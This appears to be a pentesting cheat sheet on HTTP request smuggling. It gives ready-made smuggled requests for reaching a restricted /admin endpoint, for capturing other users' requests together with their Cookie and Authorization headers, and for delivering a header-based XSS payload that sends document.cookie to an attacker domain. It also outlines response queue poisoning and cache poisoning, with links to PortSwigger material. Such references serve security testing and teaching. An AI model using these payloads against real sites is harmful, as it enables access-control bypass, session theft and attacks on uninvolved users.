# HTTP Request Smuggling

## Table of Contents
- [Access Control Bypass](#access-control-bypass)
- [Capturing Other Users' Requests](#capturing-other-users-requests)
- [Response Queue Poisoning](#response-queue-poisoning)
- [Chaining with Cache Poisoning](#chaining-with-cache-poisoning)
- [Chaining with XSS](#chaining-with-xss)

## Access Control Bypass

### A request can be delivered to the back-end without ever passing the front-end's checks. [^1]

- Reaching an endpoint the front-end restricts
    ```http
    POST / HTTP/1.1
    Host: [VULNERABLE-SERVICE]
    Content-Length: [LENGTH-OF-THE-WHOLE-BODY]
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    Host: [VULNERABLE-SERVICE]
    Foo: x
    ```
    The front-end authorizes only the `POST /` it sees; the back-end treats the remainder as a separate request that was never inspected.

## Capturing Other Users' Requests

### The next user's request is appended to the smuggled one, so their session cookies and submitted data end up somewhere the attacker can read.

- Storing another user's request in an attacker-readable location
    ```http
    POST / HTTP/1.1
    Host: [VULNERABLE-SERVICE]
    Content-Length: [LENGTH-OF-THE-WHOLE-BODY]
    Transfer-Encoding: chunked

    0

    POST /comment HTTP/1.1
    Host: [VULNERABLE-SERVICE]
    Content-Type: application/x-www-form-urlencoded
    Content-Length: [LENGTH-LARGER-THAN-THE-SMUGGLED-BODY]

    comment=
    ```
    The victim's request, including its `Cookie` and `Authorization` headers, is consumed as the remainder of `comment` and published on the page.

## Response Queue Poisoning

### Once responses on a connection are offset by one, every subsequent user is served a response that belongs to someone else.

- Serving other users' authenticated responses
    - A complete smuggled request leaves one extra response queued on the connection. From then on, each user receives the previous user's response, which may contain their personal data or session information, until the connection is closed.
    - PortSwigger, [Response queue poisoning](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning)

## Chaining with Cache Poisoning

### A response intended for the attacker can be stored in a shared cache, turning a self-targeted issue into one that affects every user served by that cache.

- Poisoning a shared cache with an attacker-controlled response
    - PortSwigger, [Web cache poisoning via HTTP request smuggling](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-perform-web-cache-poisoning)

## Chaining with XSS

### XSS can be delivered to other users with no interaction at all, including through request headers that cannot be targeted with a crafted link.

- Delivering a header-based XSS to the next user
    ```http
    POST / HTTP/1.1
    Host: [VULNERABLE-SERVICE]
    Content-Length: [LENGTH-OF-THE-WHOLE-BODY]
    Transfer-Encoding: chunked

    0

    GET /product HTTP/1.1
    Host: [VULNERABLE-SERVICE]
    User-Agent: "><script>fetch('https://[ATTACKER-DOMAIN]/?c='+document.cookie)</script>
    Foo: x
    ```
    The victim receives the response to the smuggled request, so the payload executes on the vulnerable origin without the victim clicking anything.

[^1]: Applies when the front-end and the back-end disagree on where a request ends, for example when one honours `Content-Length` and the other honours `Transfer-Encoding`.
